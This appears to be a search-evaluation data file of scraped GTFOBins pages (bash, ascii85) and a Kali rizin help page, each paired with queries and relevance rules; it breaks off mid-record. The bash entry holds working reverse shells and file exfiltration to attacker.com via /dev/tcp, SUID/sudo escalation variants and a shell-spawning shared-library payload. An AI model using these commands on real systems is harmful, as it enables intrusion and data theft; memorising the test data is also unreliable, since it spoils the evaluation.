@@ -1,0 +1,376 @@
+{
+  "documents": [
+    {
+      "chunk_id": "281-0",
+      "doc_id": 281,
+      "title": "bash | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/bash/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 10491,
+      "body": ".. / bash Shell Reverse shell File write File read Upload Download Library load Shell This executable can spawn an interactive system shell. Unprivileged This function can be performed by any unprivileged user. bash Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p Reverse shell This executable can send back a reverse system shell to a listening attacker. Unprivileged This function can be performed by any unprivileged user. bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1' Listener A TCP server can be used on the attacker box to receive the shell. nc -l -p 12345 File write This executable can write data to local files. Unprivileged This function can be performed by any unprivileged user. bash -c 'echo DATA >/path/to/output-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo DATA >/path/to/output-file' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo DATA >/path/to/output-file' Comment This only works interactively from an existing bash session. It adds timestamps to the output file. Unprivileged This function can be performed by any unprivileged user. HISTIGNORE='history *' history -c DATA history -w /path/to/output-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . HISTIGNORE='history *' history -c DATA history -w /path/to/output-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. HISTIGNORE='history *' history -c DATA history -w /path/to/output-file Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. bash -c 'echo \"$(</path/to/input-file)\"' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo \"$(</path/to/input-file)\"' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo \"$(</path/to/input-file)\"' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Comment This only works interactively from an existing bash session. Unprivileged This function can be performed by any unprivileged user. HISTTIMEFORMAT=$'\\r\\e[K' history -c history -r /path/to/input-file history Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . HISTTIMEFORMAT=$'\\r\\e[K' history -c history -r /path/to/input-file history SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. HISTTIMEFORMAT=$'\\r\\e[K' history -c history -r /path/to/input-file history Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Upload This executable can upload local data. Unprivileged This function can be performed by any unprivileged user. bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Receiver An HTTP server can be used on the attacker box to receive the data. nc -l -p 80 | awk 'BEGIN {RS=\"\\r\\n\\r\\n\";ORS=\"\"} NR==2' >/path/to/output-file Unprivileged This function can be performed by any unprivileged user. bash -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Receiver A TCP server can be used on the attacker box to receive the data. nc -l -p 12345 >/path/to/output-file Download This executable can download remote data. Unprivileged This function can be performed by any unprivileged user. bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\ 3<>/dev/tcp/attacker.com/12345 \\ | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\ 3<>/dev/tcp/attacker.com/12345 \\ | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\ 3<>/dev/tcp/attacker.com/12345 \\ | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Sender An HTTP server can be used on the attacker box to send the data. python -m http.server 80 Unprivileged This function can be performed by any unprivileged user. bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file' Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Sender A TCP server can be used on the attacker box to send the data. nc -l -p 12345 </path/to/input-file Library load This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Unprivileged This function can be performed by any unprivileged user. bash -c 'enable -f /path/to/lib.so x' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bash -c 'enable -f /path/to/lib.so x' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bash -p -c 'enable -f /path/to/lib.so x' Payload As an example, the following can be used to create a minimal shared library ( lib.so ) that spawns a shell upon loading: echo '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\ | gcc -w -fPIC -shared -o lib.so -x c - Add the usual -p argument to the shell for SUID contexts. Consider calling setuid(0); beforehand if the executable has the CAP_SETUID capability assigned.",
+      "requests": [
+        {
+          "decision_id": "052133b94aa3efb9556c-0",
+          "query": "GTFOBins outbound shell examples",
+          "information_need": "Locate direct outbound reverse-shell examples in GTFOBins.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone."
+        },
+        {
+          "decision_id": "356bbe0155d9c9b89120-0",
+          "query": "GTFOBins read protected files with setuid",
+          "information_need": "Find direct documented file reads under SUID.",
+          "rule": "Must provide a way to retrieve substantive content from a specified local file. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "4109abf334212d6c2630-0",
+          "query": "GTFOBins unprivileged connect back shell",
+          "information_need": "Find a direct reverse-shell example in an unprivileged context.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested unprivileged context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "572eb30db93f0f96059f-0",
+          "query": "GTFOBins SUID reverse shell examples",
+          "information_need": "Find a direct outbound shell example for an executable with SUID.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "80847c165a6ceeb73198-0",
+          "query": "reverse shell examples from GTFOBins",
+          "information_need": "Find executable entries in the GTFOBins collection that document an outbound reverse shell.",
+          "rule": "GTFOBins page with a reverse shell function or an actual reverse-shell example. A local shell, a bind shell, or mere mention is insufficient."
+        },
+        {
+          "decision_id": "aaa9d637c54240cb8b7d-0",
+          "query": "GTFOBins write contents to a local file with sudo",
+          "information_need": "Find a documented way to write selected content to a chosen local path via sudo.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "b40c182027d23d2066ed-0",
+          "query": "GTFOBins reverse shell through sudo",
+          "information_need": "Find direct reverse-shell examples documented with sudo.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "caa1c3e0a284d5892dd2-0",
+          "query": "GTFOBins sudo arbitrary file write",
+          "information_need": "Find GTFOBins entries whose file-write function can run under sudo.",
+          "rule": "GTFOBins page that documents writing to a chosen local path in the sudo context. File read, only redirecting unprivileged output, or unrelated mention of sudo does not suffice."
+        }
+      ]
+    },
+    {
+      "chunk_id": "573-0",
+      "doc_id": 573,
+      "title": "rizin | Kali Linux Tools",
+      "url": "https://www.kali.org/tools/rizin/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 20542,
+      "body": "Packages and Binaries: librizin-common Arch independent files from the Rizin suite Rizin is a fork of the radare2 reverse engineering framework with a focus on usability, working features and code cleanliness. Rizin is portable and it can be used to analyze binaries, disassemble code, debug programs, as a forensics tool, as a scriptable command-line hexadecimal editor able to open disk files, and much more! This package provides the arch independent files from Rizin. Installed size: 8.77 MB How to install: sudo apt install librizin-common librizin-dev Devel files from the Rizin suite Rizin is a fork of the radare2 reverse engineering framework with a focus on usability, working features and code cleanliness. Rizin is portable and it can be used to analyze binaries, disassemble code, debug programs, as a forensics tool, as a scriptable command-line hexadecimal editor able to open disk files, and much more! This package provides the devel files from Rizin. Installed size: 1.74 MB How to install: sudo apt install librizin-dev Dependencies: librizin0 libssl-dev librizin0 Libraries from the Rizin suite Rizin is a fork of the radare2 reverse engineering framework with a focus on usability, working features and code cleanliness. Rizin is portable and it can be used to analyze binaries, disassemble code, debug programs, as a forensics tool, as a scriptable command-line hexadecimal editor able to open disk files, and much more! This package provides the libraries from Rizin. Installed size: 18.01 MB How to install: sudo apt install librizin0 Dependencies: libc6 libcapstone5 liblz4-1 liblzma5 libmspack0t64 libpcre2-16-0 libpcre2-32-0 libpcre2-8-0 librizin-common libssl3t64 libxxhash0 libzip5 libzstd1 zlib1g rizin Reverse engineering framework and command-line toolset Rizin is a fork of the radare2 reverse engineering framework with a focus on usability, working features and code cleanliness. Rizin is portable and it can be used to analyze binaries, disassemble code, debug programs, as a forensics tool, as a scriptable command-line hexadecimal editor able to open disk files, and much more! Installed size: 334 KB How to install: sudo apt install rizin Dependencies: libc6 librizin0 rizin Advanced commandline hexadecimal editor, disassembler and debugger root@kali:~# rizin -h Usage: rizin [-ACdfLMnNqStuvwzX] [-P patch] [-p prj] [-a arch] [-b bits] [-i file] [-s addr] [-B baddr] [-m maddr] [-c cmd] [-e k=v] file|pid|-|--|= -- Run rizin without opening any file = Same as 'rizin malloc://512' - Read file from stdin -= Perform R=! command to run all commands remotely -0 Print \\x00 after init and every command -1 Redirect stderr to stdout -2 Close stderr file descriptor (silent warning messages) -a arch Set asm.arch -A Run 'aaa' command to analyze all referenced code -b bits Set asm.bits -B baddr Set base address for PIE binaries -c 'cmd..' Execute rizin command -C File is host:port (alias for -cR+http://%%s/cmd/) -d Debug the executable 'file' or running process 'pid' -D backend Enable debug mode (e cfg.debug=true) -e k=v Evaluate config var -E endian Endianness -E big or -E little -f Block size = file size -F binplug Force to use that rbin plugin -h, -hh Show help message, -hh for long -H [var] Display variable -i file Run script file -I file Run script file before the file is opened -k OS/kern Set asm.os (linux, macos, w32, netbsd, ...) -l lib Load plugin file -L List supported IO plugins -m addr Map file at given address (loadaddr) -M Do not demangle symbol names -n, -nn Do not load RzBin info (-nn only load bin structures) -N Do not load user settings and scripts -NN Do not load any script or plugin -q Quiet mode (no prompt) and quit after -i and -c -qq Quiet mode (no prompt) and force quit -p p.rzdb Load project file -r rz-run Specify rz-run profile to load (same as -e dbg.profile=X) -R rule Specify custom rz-run directive -s addr Initial seek -T Do not compute file hashes -u Set bin.filter=false to get raw sym/sec/cls names -v, -V Show rizin version (-V show lib versions) -w Open file in write mode -x Open without exec-flag (asm.emu will not work), See io.exec -X Same as -e bin.usextr=false (useful for dyldcache) -z, -zz Do not load strings or load them even in raw rz-ar List and extract members from .a and .lib archives root@kali:~# rz-ar -h Usage: rz-ar [-hlqv] [-o outdir] archive [member ...] -h Show this help -l List matching members -o dir Set output directory (default .) -q Quiet mode -v Show version information rz-asm Rizin assembler and disassembler tool root@kali:~# rz-asm -h Usage: rz-asm [-ACdDehLBvw] [-a arch] [-b bits] [-m plugin] [-o addr] [-s syntax] [-f file] [-F fil:ter] [-i skip] [-l len] 'code'|hex|- -a arch Set architecture to assemble/disassemble (see -L) -A Show Analysis information from given hexpairs -b bits Set cpu register size (8, 16, 32, 64) (RZ_ASM_BITS) -B Binary input/output (-l is mandatory for binary input) -c cpu Select specific CPU (depends on arch) -C Output in C format -d, -D Disassemble from hexpair bytes (-D show hexpairs) -e Use big endian instead of little endian -I Display lifted RzIL code (same input as in -d, IL is also validated) -E Display ESIL expression (same input as in -d) -f file Read data from file -F in:out Specify input and/or output filters (att2intel, x86.pseudo, ...) -h, -hh Show this help, -hh for long -i len Ignore N bytes of the input buffer -j Output in JSON format -k kernel Select operating system (linux, windows, darwin, ..) -l len Input/Output length -L List Asm plugins: (a=asm, d=disasm, A=analyze, e=ESIL, I=RzIL) -m plugin List supported CPUs for the chosen plugin -o, -@ addr Set start address for code (default 0) -O file Output file name (rz-asm -Bf a.asm -O a) -p Run SPP over input for assembly -q Quiet mode -s syntax Select syntax (intel, att) -v Show version information -x Use hex dwords instead of hex pairs when assembling. -w Describe opcode If '-l' value is greater than output length, output is padded with nops If the last argument is '-' reads from stdin Environment: RZ_ARCH e asm.arch # architecture to assemble/disassemble (same as rz-asm -a) RZ_ASM_ARCH # architecture to assemble/disassemble (same as rz-asm -a) RZ_ASM_BITS # cpu register size (8, 16, 32, 64) (same as rz-asm -b) RZ_BITS e asm.bits # cpu register size (8, 16, 32, 64) (same as rz-asm -b) RZ_DEBUG # if defined, show error messages and crash signal RZ_NOPLUGINS # do not load shared plugins (speedup loading) rz-ax Rizin base converter root@kali:~# rz-ax -h Usage: rz-ax [options] [expr ...] If expr is not provided, reads from stdin int -> hex ; rz-ax 10 hex -> int ; rz-ax 0xa -int -> hex ; rz-ax -77 -hex -> int ; rz-ax 0xffffffb3 int -> bin ; rz-ax b30 int -> ternary ; rz-ax t42 bin -> int ; rz-ax 1010d ternary -> int ; rz-ax 1010dt float -> hex ; rz-ax 3.33f hex -> float ; rz-ax Fx40551ed8 oct -> hex ; rz-ax 35o hex -> oct ; rz-ax Ox12 (O is a letter) bin -> hex ; rz-ax 1100011b hex -> bin ; rz-ax Bx63 ternary -> hex ; rz-ax 212t hex -> ternary ; rz-ax Tx23 raw -> hex ; rz-ax -S < /binfile hex -> raw ; rz-ax -s 414141 = base ; rz-ax =10 0x46 -> output in base 10 -l ; append newline to output (for -E/-D/-r/.. -a show ascii table ; rz-ax -a -b bin -> str ; rz-ax -b 01000101 01110110 -B str -> bin ; rz-ax -B hello -d force integer ; rz-ax -d 3 -> 3 instead of 0x3 -e swap endianness ; rz-ax -e 0x33 -D base64 decode -E base64 encode -f floating point ; rz-ax -f 6.3+2.1 -F stdin slurp code hex ; rz-ax -F < shellcode.[c/py/js] -h show this help ; rz-ax -h -i dump as C byte array ; rz-ax -i < bytes -I IP address <-> LONG ; rz-ax -I 3530468537 -k keep base ; rz-ax -k 33+3 -> 36 -L bin -> hex(bignum) ; rz-ax -L 111111111 # 0x1ff -n int value -> hexpairs ; rz-ax -n 0x1234 # 34120000 -o octalstr -> raw ; rz-ax -o \\162 \\172 # rz -N binary number ; rz-ax -N 0x1234 # \\x34\\x12\\x00\\x00 -r rz style output ; rz-ax -r 0x1234 -s hexstr -> raw ; rz-ax -s 43 4a 50 -S raw -> hexstr ; rz-ax -S < /bin/ls > ls.hex -t Unix tstamp -> str ; rz-ax -t 1234567890 -m MS-DOS tstamp -> str ; rz-ax -m 1234567890 -W Win32 tstamp -> str ; rz-ax -W 1234567890 -x hash string ; rz-ax -x linux osx -u units ; rz-ax -u 389289238 # 317.0M -w signed word ; rz-ax -w 16 0xffff -v version ; rz-ax -v -p position of set bits ; rz-ax -p 0xb3 rz-bin Binary program info extractor root@kali:~# rz-bin -h Usage: rz-bin [-AcdeEghHiIjlLMqrRsSUvVxzZ] [-@ at] [-a arch] [-b bits] [-B addr] [-C F:C:D] [-f str] [-m addr] [-n str] [-N m:M] [-P pdb] [-o str] [-O str] [-k query] [-D lang symname] file -@ addr Show section, symbol, or import at the given address -A List sub-binaries and their arch-bits pairs -a arch Set arch (x86, arm, .. or <arch>_<bits>) -b bits Set bits (32, 64 ...) -B addr Override base address (pie bins) -c List classes -cc List classes in header format -C fmt:C:D Create [elf,mach0,pe] with Code and Data hexpairs (see -a) -d Show debug/dwarf information -dd Load debug/dwarf information from debuginfod server -D lang name Demangle symbol name (-D all for bin.demangle=true) -e Entrypoint -ee Constructor/destructor entrypoints -E Globally exportable symbols -f mach Select sub-binary for the machine [mach]. -F binfmt Force to use that bin plugin (ignore header check) -g Same as -SMZIHVResizcld -SS -SSS -ee (show all info) -G addr Load address . offset to header -h Show this help -H Header fields -i Import (symbols imported from libraries) -I Binary info -j Output in JSON -k sdb-query Run sdb query. for example: '*' -K algo Calculate checksums (md5, sha1, ..) -l Linked libraries -L [plugin] List supported bin plugins or plugin details -m addr Show source line at addr -M Main (show address of main symbol) -n str Show section, symbol or import named str -N min:max Force min:max number of chars per string (see -z and -zz) -o str Output file/folder for write operations (out by default) -O str Write/extract operations (-O help) -p Show physical addresses -P Show debug/pdb information -PP Download pdb file for binary -q Quiet mode, just show fewer data -qq Show less info (no offset/size for -z for ex.) -Q Show load address used by dlopen (non-aslr libs) -r Show output in rizin format -R Show relocations -s Symbols -S Sections -SS Segments -SSS Sections mapping to segments -T Display file signature -u Unfiltered (no rename duplicated symbols/sections) -U Resources -v Show version information -V Show binary version information -w Display try/catch blocks -x Extract bins contained in file -Y Calculate all the possibles base address candidates of a firmware bin -z Show strings (from data section) -zz Show strings (from raw strings from bin) -zzz Dump raw strings to stdout (for huge files) -Z Guess size of binary program Environment: RZ_BIN_CODESIGN_VERBOSE: # make code signatures verbose RZ_BIN_DEBUGINFOD_URLS: e bin.dbginfo.debuginfod_urls # use alternative debuginfod server RZ_BIN_DEMANGLE=0: e bin.demangle # do not demangle symbols RZ_BIN_LANG: e bin.lang # assume lang for demangling RZ_BIN_MAXSTRBUF: e search.str.max_length # specify maximum buffer size RZ_BIN_PDBSERVER: e pdb.server # use alternative PDB server RZ_BIN_PREFIX: e bin.prefix # prefix symbols/sections/relocs with a specific string RZ_BIN_STRFILTER: e bin.str.filter # rizin -qc 'e bin.str.filter=??' - RZ_BIN_STRPURGE: e bin.str.purge # try to purge false positives RZ_BIN_SYMSTORE: e pdb.symstore # path to downstream PDB symbol store RZ_CONFIG: # config file RZ_COLOR: # enables/disables colors support RZ_UTF8: # enables/disables utf8 support RZ_NOPLUGINS: # do not load plugins rz-diff Compare files and find binary differences root@kali:~# rz-diff -h Usage: rz-diff [options] <file0> <file1> -a arch Specify architecture plugin to use (x86, arm, ..) -b bits Specify register size for arch (16 (thumb), 32, 64, ..) -d myers Compute edit distance using Eugene W. Myers' O(ND) algorithm (no substitution) -d leven Compute edit distance using Levenshtein O(N^2) algorithm (with substitution) -d lcs-roll Compute edit distance using Myers+FastCDC with chunk size 128 (-0 to change chunk size) -d ssdeep Compute edit distance using Context triggered piecewise hashing comparison -i Use command line arguments instead of files (only for -d) -H Hexadecimal visual mode -h Show this help -j JSON output -q Quiet output -v Show version information -V Be more verbose (stderr output) -K theme Set a give color theme (see rizin 'eco' command) -e k=v Set an evaluable config variable -A Compare virtual and physical addresses -B Run 'aaa' when loading the bin -C Disable colors -T Show timestamp information -S WxH Set the width and height of the terminal for visual mode -0 cmd Input for file0 when option -t 'commands' is given. The same value will be set for file1, if -1 is not set. -1 cmd Input for file1 when option -t 'commands' is given. -t bytes Compare raw bytes in the files (only for small files) -t lines Compare text files -t functions Compare functions found in the files optional -0 <fcn name|offset> to compare only one function -t classes Compare classes found in the files -t command Compare command output returned when executed in both files requires -0 <cmd> and -1 <cmd> is optional -t entries Compare entries found in the files -t fields Compare fields found in the files -t graphs Compare 2 functions and outputs in graphviz/dot format requires -0 <fcn name|offset> and -1 <fcn name|offset> is optional -t imports Compare imports found in the files -t libraries Compare libraries found in the files -t sections Compare sections found in the files -t strings Compare strings found in the files -t symbols Compare symbols found in the files Palette colors can be changed by adding the following lines inside the $HOME/.rizinrc file ec diff.unknown blue | offset color ec diff.match green | match color ec diff.unmatch red | mismatch color Environment variables RZ_COLOR | enables/disables colors support rz-find Find byte patterns in files root@kali:~# rz-find -h Usage: rz-find [-mXnzZhqvV] [-a align] [-b sz] [-f/t from/to] [-[e|s|w|S|I] str] [-x hex] [-R cmd] -|file|dir .. -a align Only accept aligned hits -b size Set block size -e regex Search for regex matches (can be used multiple times) -E cmd Execute shell command for each file found. -R cmd Execute Rizin command for each search hit. -f from Start searching from address 'from' -F file Read the contents of the file and use it as keyword -h Show this help -i Identify filetype (magic signatures) -j Output in JSON -m Magic search, file-type carver -M str Set a binary mask to be applied on keywords -n Do not stop on read errors -r Print using rizin commands -s str Search for a specific string (can be used multiple times) -w str Search for a specific wide string (can be used multiple times). Assumes str is UTF-8. -I str Search for an entry in import table. -S str Search for a symbol in symbol table. -t to Stop search at address 'to' -q Quiet - do not show headings (filenames) above matching contents (default for searching a single file) -v Show version information -V Verbose: prints each file scanned -x hex Search for hexpair string (909090) (can be used multiple times) -X Show hexdump of search results -z Search for zero-terminated strings -Z Show string found on each search hit rz-gg Rizin frontend for RzEgg, compile programs into tiny binaries for different architectures root@kali:~# rz-gg -h Usage: rz-gg [-FOLsrxhvz] [-a arch] [-b bits] [-k os] [-o file] [-I path] [-i sc] [-e enc] [-B hex] [-c k=v] [-C file] [-p pad] [-q off] [-S string] [-f fmt] [-nN dword] [-dDw off:hex] file|f.asm|- -a arch Select architecture (x86, mips, arm) -b bits Set Register size (32, 64, ..) -B hexpairs Append some hexpair bytes -c k=v Set configuration options -C file Append contents of file -d off:dword Patch dword (4 bytes) at given offset -D off:qword Patch qword (8 bytes) at given offset -e encoder Use specific encoder. see -L -f format Output format (raw, c, pe, elf, mach0, python, javascript) -F Output native format (osx=mach0, linux=elf, ..) -h Show this help -i shellcode Include shellcode plugin, uses options. see -L -I path Add include path -k kernel Operating system's kernel (linux,bsd,osx,w32) -L List all plugins (shellcodes and encoders) -n dword Append 32bit number (4 bytes) -N qword Append 64bit number (8 bytes) -o file Output file -O Use default output file (filename without extension or a.out) -p padding Add padding after compilation (padding=n10s32) ntas : begin nop, trap, 'a', sequence NTAS : same as above, but at the end -P size Prepend debruijn sequence of given length -q fragment Debruijn pattern offset -r Show raw bytes instead of hexpairs -s Show assembler -S string Append a string -v Show version information -V Increase the verbosity -w off:hex Patch hexpairs at given offset -x Execute -X Execute rop chain, using the stack provided -z Output in C string syntax rz-hash Block based hashing utility root@kali:~# rz-hash -h Usage: rz-hash [-vhBkjLq] [-b S] [-a A] [-c H] [-E A] [-D A] [-s S] [-x S] [-f O] [-t O] [files|-] ... -v Show version information -h Show this help - Input read from stdin instead from a file -a algo Hash algorithm to use and you can specify multiple ones by Appending a comma (example: sha1,md4,md5,sha256) -B Output the calculated value for each block -b size Set the block size -c value Compare calculated value with a given one (hexadecimal) -e endian Set the endianness (default: 'big' accepted: 'big' or 'little') -D algo Decrypt the given input; use -S to set key and -I to set IV (if needed) -E algo Encrypt the given input; use -S to set key and -I to set IV (if needed) -f from Start the calculation at given offset -t to Stop the calculation at given offset -I iv Set the initialization vector (IV) -i times Repeat the calculation N times -j Output the result as a JSON structure -k Output the calculated value using openssh's randomkey algorithm -L List all algorithms -q Set quiet mode (use -qq to get only the calculated value) -S seed Set the seed for -a, use '^' to append it before the input, use '@' Prefix to load it from a file and '-' from read it -K key Set the hmac key for -a and the key for -E/-D, use '@' prefix to Load it from a file and '-' from read it From stdin (you can combine them) -s string Input read from a zero-terminated string instead from a file -x hex Input read from a hexadecimal value instead from a file All the input (besides -s/-x/-c) can be hexadecimal or strings If 's:' prefix is specified rz-run Rizin utility to run programs in custom environments root@kali:~# rz-run -h Usage: rz-run [directives | script.rz] [-- program [args]] -h Show this help -l Show profile directives -t Output template profile -v Show version information -w Wait for incoming terminal process -- program [args] Run program rz-sign Rizin signature utility root@kali:~# rz-sign -h Usage: rz-sign [-aqv] [-e k=v] (-c pat sig | -o sig bin | -d sig) -h Show this help -a, -aa Add extra 'a' to analysis command (available only with -o option) -e k=v Set an evaluable config variable (available only with -o option) -c output.pat input.sig Parse a FLIRT signature and convert it to its other format -o output.sig input.bin Perform an analysis on the binary and generate the FLIRT signature -d flirt.sig Parse a FLIRT signature and dump its content -q Quiet mode -v Show version information Examples: rz-sign -d signature.sig rz-sign -c new_signature.pat old_signature.sig rz-sign -o libc.sig libc.so.6 rz-test Rizin regression testsuite root@kali:~# rz-test -h Usage: rz-test [-qvVnL] [-j threads] [test file/dir | @test-type] -h Show this help -v Show version information -q Quiet mode -V Be verbose -N Disable diffing unless the test fails. -i Interactive mode -y Accept all interactive changes -n Do nothing (don't run any test, just load/parse them) -L Log mode (better printing for CI, logfiles, etc.) -F dir Run fuzz tests (open and default analysis) on all files in the given dir -j threads How many threads to use for running tests concurrently (default is 8) -r bindir Path to rizin bin folder (default is $PATH) -f file File to use for JSON tests (default is bins/elf/crackme0x00b) -C dir Chdir before running rz-test (default follows test pathname/cwd) -t seconds Timeout per test (default is 960 seconds) -o file Output test run information in JSON format to file -e dir Exclude a particular directory while testing (this option can appear many times) -s num Number of expected successful tests -x num Number of expected failed tests Supported test types: @json @unit @fuzz @cmds OS/Arch for archos tests: linux-x64",
+      "requests": [
+        {
+          "decision_id": "7d7c5ea81949789eed6b-0",
+          "query": "compare GTFOBins and Kali sudo tool documentation",
+          "information_need": "Find actual sudo behavior or workflow examples from either source.",
+          "rule": "Substantive sudo functionality from either named source; routine installation commands alone are insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "185-0",
+      "doc_id": 185,
+      "title": "ascii85 | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/ascii85/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 496,
+      "body": ".. / ascii85 File read File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. ascii85 /path/to/input-file | ascii85 --decode Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . ascii85 /path/to/input-file | ascii85 --decode",
+      "requests": [
+        {
+          "decision_id": "05c97b9366e607bfb881-0",
+          "query": "GTFOBins read a local file under sudo",
+          "information_need": "Find a direct read of a chosen local file with sudo.",
+          "rule": "Must provide a way to retrieve substantive content from a specified local file. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "d69f32c7d00499c3c875-0",
+          "query": "GTFOBins read protected files with setuid",
+          "information_need": "Find direct documented file reads under SUID.",
+          "rule": "Must provide a way to retrieve substantive content from a specified local file. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "171-0",
+      "doc_id": 171,
+      "title": "as | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/as/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 688,
